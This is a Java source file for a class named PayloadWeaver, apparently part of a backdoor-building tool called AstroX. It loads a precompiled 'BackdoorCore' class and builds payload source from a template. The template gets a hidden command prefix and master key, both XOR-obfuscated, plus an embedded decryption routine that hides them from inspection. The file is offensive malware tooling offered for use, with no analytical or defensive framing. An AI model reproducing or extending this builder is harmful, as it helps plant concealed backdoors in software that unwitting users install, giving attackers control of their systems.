package dev.naruto.astrox.core;

import dev.naruto.astrox.Config;
import dev.naruto.astrox.utils.CryptoUtil;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class PayloadWeaver {
    private final int obfuscationLevel;

    public PayloadWeaver(int obfuscationLevel) {
        this.obfuscationLevel = obfuscationLevel;
    }

    /**
     * Generate payload by loading pre-compiled BackdoorCore class
     * from AstroX's own JAR resources
     */
    public byte[] generatePayload() throws IOException {
        // Load the compiled BackdoorCore.class from our JAR
        String classPath = "/dev/naruto/astrox/payload/BackdoorCore.class";

        try (InputStream is = getClass().getResourceAsStream(classPath)) {
            if (is == null) {
                throw new IOException("BackdoorCore.class not found in JAR resources! Path: " + classPath);
            }

            byte[] classBytes = is.readAllBytes();

            if (classBytes.length == 0) {
                throw new IOException("BackdoorCore.class is empty!");
            }

            System.out.println("[*] Loaded BackdoorCore (" + classBytes.length + " bytes)");
            return classBytes;
        }
    }

    /**
     * Weave configuration into source code template
     * (Currently not used, but kept for future runtime compilation)
     */
    public String weave(String templateContent, String packageName, String className) {
        Map<String, String> replacements = new HashMap<>();

        replacements.put("PACKAGE_NAME", packageName);
        replacements.put("CLASS_NAME", className);

        replacements.put("COMMAND_PREFIX_ENC", CryptoUtil.byteArrayToCode(
                CryptoUtil.xor(Config.COMMAND_PREFIX.getBytes(StandardCharsets.UTF_8), Config.XOR_KEY)
        ));

        replacements.put("MASTER_KEY_ENC", CryptoUtil.byteArrayToCode(
                CryptoUtil.xor(Config.MASTER_KEY.getBytes(StandardCharsets.UTF_8), Config.XOR_KEY)
        ));

        replacements.put("XOR_KEY", CryptoUtil.byteArrayToCode(Config.XOR_KEY));

        replacements.put("DECRYPT_METHOD",
                "private String decrypt(byte[] e) { " +
                        "byte[] d = new byte[e.length]; " +
                        "byte[] k = " + CryptoUtil.byteArrayToCode(Config.XOR_KEY) + "; " +
                        "for(int i=0;i<e.length;i++) d[i]=(byte)(e[i]^k[i%k.length]); " +
                        "return new String(d, java.nio.charset.StandardCharsets.UTF_8); }"
        );

        String source = templateContent;
        for (Map.Entry<String, String> entry : replacements.entrySet()) {
            source = source.replace("{{" + entry.getKey() + "}}", entry.getValue());
        }

        return source;
    }

    public String loadTemplate() throws IOException {
        try (InputStream is = getClass().getResourceAsStream("/templates/payload.template")) {
            if (is == null) return "";
            return new String(is.readAllBytes(), StandardCharsets.UTF_8);
        }
    }
}
